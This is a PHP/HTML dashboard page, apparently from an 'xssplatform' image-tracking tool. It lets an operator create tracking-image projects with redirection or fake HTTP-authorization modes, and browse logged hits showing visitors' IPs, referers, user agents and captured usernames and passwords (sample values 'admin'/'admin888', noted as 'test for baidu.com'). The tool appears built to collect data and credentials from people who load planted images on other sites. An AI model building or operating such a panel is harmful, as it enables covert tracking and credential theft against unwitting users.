<?php
include('init.php');
include('./inc/header.php');
if(!chklogin($_SESSION['user'])){
	header("Location: ./login.php");
	exit;
}

?>

<div id="main_panel">

<!--main_panel_menu start-->
<div id="main_panel_menu" class="well">
	<ul id="main_panel_menu_ul" class="nav nav-list">
		<li class="nav-header">IMG Track:</li>
		<li class="active" id="home_page"><a href="#home">&nbsp;<i class="icon-home icon-white"></i>&nbsp;Home</a></li>
		<li id="create_new_project"><a href="#new project">&nbsp;<i class="icon-file icon-white"></i>&nbsp;New Project</a></li>
		<li id="refresh_projects_list"><a href="#refresh project">&nbsp;<i class="icon-refresh icon-white"></i>&nbsp;Refresh Project</a></li>
		<li class="nav-header">Project:</li>

		<li class="project_list_item"><a href="#none">&nbsp;<i class="icon-chevron-right icon-white"></i>&nbsp;none</a></li>
		<li class="divider" id="projects_list_divider"></li>
		<li id="logout_btn"><a href="#logout">&nbsp;<i class="icon-off icon-white"></i>&nbsp;Logout</a></li>
	</ul>
</div>
<!--main_panel_menu end-->

<div id="main_panel_content">

<!--tools bar start-->
<div id="tools_div" class="navbar">
	<div class="navbar-inner">
		<div class="btn-toolbar pull-left">
			<div class="btn-group">
				<button class="btn" type="button" title="Delete all selected" id="delete_selected_trackinfo"><i class="icon-trash"></i></button>
				<button class="btn" type="button" title="Unfold all trackinfo" id="unfold_and_fold_all_trackinfo"><i class="icon-plus"></i></button>
			</div>
			<div class="btn-group">
				<button class="btn" type="button" title="Edit current project" id="edit_proj" disable="disable"><i class="icon-cog"></i></button>
				<button class="btn" type="button" title="Delete current project" id="delete_proj" disable="disable"><i class="icon-trash"></i></button>
				<button class="btn" type="button" title="Refresh track url" id="toolsbar_refresh"><i class="icon-refresh"></i></button>
				<button class="btn" type="button" title="Show current project info" id="show_proj_info" disable="disable"><i class="icon-info-sign"></i></button>
				<button class="btn" type="button" title="Hide all" id="hide_all" disable="disable"><i class="icon-arrow-up"></i></button>
			</div>
		</div>

		<select class="pull-left" id="track_info_domains">
			<option value ="all">All domains</option>
			<option value ="nulll">null</option>
			<option value ="test">test</option>
		</select>


		<form class="navbar-form pull-right">
			<input type="text" class="search-query">
			<button type="button" class="btn"><i class="icon-search"></i></button>
		</form>
	</div>
</div>
<!--tools bar end-->

<!--new project start-->
<div id="new_project" style="display:none;">
<form action="#">
	<table class="table table-hover table_td_fontsmaller">
	<thead>
		<th>Directive</th>
		<th>Value</th>
	</thead>
	<tr>
		<td>Project name</td>
		<td>
			<input class="input-xxlarge" placeholder="Project name" type="text" name="new_proj_name" id="new_proj_name">
		</td>
	</tr>
	<tr>
		<td>State</td>
		<td>
			<select>
				<option name="new_proj_logging" value="1" selected="selected">Logging</option>
				<option name="new_proj_logging" value="0">Stop</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Filter</td>
		<td>
			<select>
				<option name="new_proj_filter" value="0" selected="selected">No</option>
				<option name="new_proj_filter" value="1">Yes</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Type</td>
		<td>
			<select>
				<option name="new_proj_type" value ="0" selected="selected">Normal track</option>
				<option name="new_proj_type" value ="1">Track + Redirection</option>
				<option name="new_proj_type" value ="2">Track + HTTP Authorization</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Value</td>
		<td>
			<input class="input-xxlarge" placeholder="Value" type="text" name="new_proj_value" id="new_proj_value">
		</td>
	</tr>
	<tr>
		<td>Type value</td>
		<td>
			<select>
				<option name="new_proj_img_type" value ="0" selected="selected">PNG</option>
				<option name="new_proj_img_type" value ="1">JPEG</option>
				<option name="new_proj_img_type" value ="2">GIF</option>
				<option name="new_proj_img_type" value ="3">BMP</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Image Detail</td>
		<td>
		
		<div class="input-prepend input-append proj_input">
		<span class="add-on">width</span>
		<input class="span1" placeholder="Width" type="text" name="new_proj_img_width" id="new_proj_img_width">
		<span class="add-on">px</span>
		</div>
		
		<div class="input-prepend input-append proj_input">
		<span class="add-on">height</span>
		<input class="span1" placeholder="Height" type="text" name="new_proj_img_height" id="new_proj_img_height">
		<span class="add-on">px</span>
		</div>
		
		<div class="input-prepend proj_input">
		<span class="add-on">Color</span>
		<input class="span2" placeholder="Background color" type="text" name="new_proj_img_bg_color" id="new_proj_img_bg_color">
		</div>
		
		</td>
	</tr>
	<tr>
		<td>Description</td>
		<td>
			<textarea placeholder="Description" class="input-xxlarge" name="new_proj_description" id="new_proj_description"></textarea>
		</td>
	</tr>
	<tr>
		<td></td>
		<td>
			<button type="button" id="new_proj_edit_save" class="btn btn-primary pull-right">Create</button>
			<button type="reset" id="new_proj_edit_cancel" class="btn pull-right">Cancel</button>
			<button type="button" id="new_proj_edit_hide" class="btn pull-right">Hide</button>
		</td>
	</tr>
	</table>
</from>
</div>
<!--new project end-->

<!--edit project start-->
<div id="project_info_edit" style="display:none;">
<form action="#">
	<table class="table table-hover table_td_fontsmaller">
	<thead>
		<th>Directive</th>
		<th>Value</th>
	</thead>
	<tr>
		<td>Project name</td>
		<td>
			<input class="input-xxlarge" placeholder="Project name" type="text" name="edit_proj_name" id="edit_proj_name">
		</td>
	</tr>
	<tr>
		<td>State</td>
		<td>
			<select>
				<option name="edit_proj_logging" id="edit_proj_logging_1" value="1">Logging</option>
				<option name="edit_proj_logging" id="edit_proj_logging_0" value="0">Stop</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Filter</td>
		<td>
			<select>
				<option name="edit_proj_filter" id="edit_proj_filter_0" value="0">No</option>
				<option name="edit_proj_filter" id="edit_proj_filter_1" value="1">Yes</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Type</td>
		<td>
			<select>
				<option name="project_info_edit_type" id="project_info_edit_type_0" value ="0">Normal track</option>
				<option name="project_info_edit_type" id="project_info_edit_type_1" value ="1">Track + Redirection</option>
				<option name="project_info_edit_type" id="project_info_edit_type_2" value ="2">Track + HTTP Authorization</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Value</td>
		<td>
			<input class="input-xxlarge" placeholder="Value" type="text" name="project_info_edit_value" id="project_info_edit_value">
		</td>
	</tr>
	<tr>
		<td>Type value</td>
		<td>
			<select>
				<option name="project_info_edit_img_type" id="project_info_edit_img_type_0" value ="0">PNG</option>
				<option name="project_info_edit_img_type" id="project_info_edit_img_type_1" value ="1">JPEG</option>
				<option name="project_info_edit_img_type" id="project_info_edit_img_type_2" value ="2">GIF</option>
				<option name="project_info_edit_img_type" id="project_info_edit_img_type_3" value ="3">BMP</option>
			</select>
		</td>
	</tr>
	<tr>
		<td>Image Detail</td>
		<td>
		
		<div class="input-prepend input-append proj_input">
		<span class="add-on">width</span>
		<input class="span1" placeholder="Width" type="text" name="project_info_edit_img_width" id="project_info_edit_img_width">
		<span class="add-on">px</span>
		</div>
		
		<div class="input-prepend input-append proj_input">
		<span class="add-on">height</span>
		<input class="span1" placeholder="Height" type="text" name="project_info_edit_img_height" id="project_info_edit_img_height">
		<span class="add-on">px</span>
		</div>
		
		<div class="input-prepend proj_input">
		<span class="add-on">Color</span>
		<input class="span2" placeholder="Background color" type="text" name="project_info_edit_img_bg_color" id="project_info_edit_img_bg_color">
		</div>
		
		</td>
	</tr>
	<tr>
		<td>Description</td>
		<td>
			<textarea class="input-xxlarge" name="project_info_edit_description" id="project_info_edit_description"></textarea>
		</td>
	</tr>
	<tr>
		<td></td>
		<td>
			<button type="button" id="project_info_edit_save" class="btn btn-primary pull-right">Save</button>
			<button type="reset" id="project_info_edit_cancel" class="btn pull-right">Cancel</button>
			<button type="button" id="project_info_edit_hide" class="btn pull-right">Hide</button>
		</td>
	</tr>
	</table>
</from>
</div>
<!--edit project end-->

<!--Project info start-->
<div id="project_info_div" style="display:none;">
	<table class="table table-hover table_td_fontsmaller">
	<thead>
		<th>Images</th>
		<th>Directive</th>
		<th>Value</th>
	</thead>
	
	<tr>
		<td rowspan="4" id="view_proj_info_img"><img id="project_img" title="Hide project info" src=""></td>
		<td>Image</td>
		<td id="view_proj_info_img_url">http://localhost/tools/xssplatform/do/auth/9a41bd94a4769b86dbd33fa81cc2a8819a41bd94a4769b#
		?df.jpg</td>
	</tr>
	<tr>
		<td>Name</td>
		<td id="view_proj_info_name">Project test 1</td>
	</tr>
	<tr>
		<td>State</td>
		<td id="view_proj_info_state">Logging</td>
	</tr>
	<tr>
		<td>Filter</td>
		<td id="view_proj_info_filter">No</td>
	</tr>
	<tr>
		<td></td>
		<td>Type</td>
		<td id="view_proj_info_type">Normal track</td>
	</tr>
	<tr>
		<td></td>
		<td>Type value</td>
		<td id="view_proj_info_value">None</td>
	</tr>
	<tr>
		<td></td>
		<td>Image Detail</td>
		<td id="view_proj_info_img_detail">PNG 140x140 #FFFFF</td>
	</tr>
	<tr>
		<td></td>
		<td>Description</td>
		<td id="view_proj_info_desc">test for baidu.com</td>
	</tr>
	<tr>
		<td></td>
		<td></td>
		<td><button type="button" id="project_info_hide" class="btn btn-primary pull-right">Hide</button></td>
	</tr>
	</table>
</div>

<!--Project info end-->

<!--pagination start-->
<div id="pagination_top_div" class="pagination pagination-mini">
	<ul>
		<li class="disabled"><a href="#total">Total:2342 / 5</a></li>
		<li class="disabled"><a href="#prev" title="1">&laquo;</a></li>
		<li class="active"><a href="#page1" title="1">1</a></li>
		<li><a href="#page2" title="2">2</a></li>
		<li><a href="#page3" title="3">3</a></li>
		<li><a href="#page4" title="4">4</a></li>
		<li><a href="#page5" title="5">5</a></li>
		<li><a href="#next" title="2">&raquo;</a></li>
	</ul>
</div>
<!--pagination end-->

<!--track info start-->
	<div id="track_info_div" class="well well-small well_bgwhite">
	<form>
	<table id="track_info_table" class="table table-hover table_td_fontsmaller">
	<thead>
		<th>#</th>
		<th><input type="checkbox" name="unselected" class="select_all_trackinfo"></th>
		<th>Time</th>
		<th>Track URL</th>
		<th>IP</th>
		<th>Operating</th>
	</thead>
	<tr class="track_info_summary">
		<td>1</td>
		<td><input type="checkbox" name="select_delete"></td>
		<td>2013-02-07 11:36:27</td>
		<td><div class="td_url">http://localhost/tools/xssplatform/do/au9881</div></td>
		<td>127.0.0.1</td>
		<td>
			<div class="btn-group">
				<button type="button" class="btn btn-mini track_info_div_detail_btn" value="234">Detail</button>
				<button type="button" class="btn dropdown-toggle btn-mini" data-toggle="dropdown">
					<span class="caret"></span>
				</button>
				<ul class="dropdown-menu">
					<li><a href="#delete track info 234" value="234" class="track_info_div_delete_btn">Delete</a></li>
				</ul>
			</div>
		</td>
	</tr>
	<tr class="track_info_div_detail track_info_div_detail_id_234" style="display:none"><td colspan="6">
		<table class="table table-bordered">
		<tr>
			<td colspan="2"><b>HTTP_REFERER</b></td>
			<td colspan="2">http://localhost/tools/xssplatform/do/auth/9a41bd881</td>
		</tr>
		<tr>
			<td colspan="2"><b>HTTP_USER_AGENT</b></td>
			<td colspan="2">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36</td>
		</tr>
		<tr>
			<td><b>IP</b></td>
			<td>127.0.0.1</td>
			<td><b>HTTP_ACCEPT_LANGUAGE</b></td>
			<td>zh-CN,zh;q=0.8</td>
		</tr>
		<tr>
			<td><b>REMOTE_HOST</b></td>
			<td>www.baidu.com</td>
			<td><b>REMOTE_PORT</b></td>
			<td>2344</td>
		</tr>
		<tr>
			<td><b>Username</b></td>
			<td>admin</td>
			<td><b>Password</b></td>
			<td>admin888</td>
		</tr>
		</table>
	</td></tr>
	
	</table>
	</form>
	</div>
<!--track info end-->

<!--pagination start-->
<div id="pagination_foot_div" class="pagination pagination-mini">
	<ul>
		<li class="disabled"><a href="#total">Total:2342 / 5</a></li>
		<li class="disabled"><a href="#prev">&laquo;</a></li>
		<li class="active"><a href="#page1">1</a></li>
		<li><a href="#page2">2</a></li>
		<li><a href="#page3">3</a></li>
		<li><a href="#page4">4</a></li>
		<li><a href="#page5">5</a></li>
		<li><a href="#next">&raquo;</a></li>
	</ul>
</div>
<!--pagination end-->

</div>

<?php
include('./inc/footer.php');
?>
